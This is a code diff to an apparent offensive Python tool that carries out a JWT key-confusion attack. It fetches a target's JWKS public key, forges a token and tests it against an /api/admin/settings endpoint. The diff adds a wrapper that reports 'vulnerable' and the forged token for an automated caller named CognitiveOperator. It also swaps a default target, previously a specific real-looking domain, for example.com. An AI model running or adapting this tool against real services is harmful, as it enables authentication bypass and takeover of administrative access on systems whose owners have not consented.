@@ -135,13 +135,18 @@ class JWTKeyConfusionEngine:
             terminal(f"{COLORS['YELLOW']}[-] Endpoint returned HTTP {status} or rejected forged token.{COLORS['RESET']}")
             return False, token
 
-async def run_jwt_confusion_engine(target_url):
+async def run_jwt_key_confusion(target_url, session_pool=None):
+    """Compatibility wrapper for CognitiveOperator."""
     engine = JWTKeyConfusionEngine(target_url)
     jwks = engine.fetch_public_key("/.well-known/jwks.json")
     pub_key_mock = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0..." if not jwks else json.dumps(jwks)
-    return engine.verify_and_exploit("/api/admin/settings", pub_key_mock)
+    success, token = engine.verify_and_exploit("/api/admin/settings", pub_key_mock)
+    return {"vulnerable": success, "forged_token": token}
+
+async def run_jwt_confusion_engine(target_url):
+    return await run_jwt_key_confusion(target_url)
 
 if __name__ == "__main__":
     import sys
-    target = sys.argv[1] if len(sys.argv) > 1 else "https://cryptobytes.online"
+    target = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
     asyncio.run(run_jwt_confusion_engine(target))
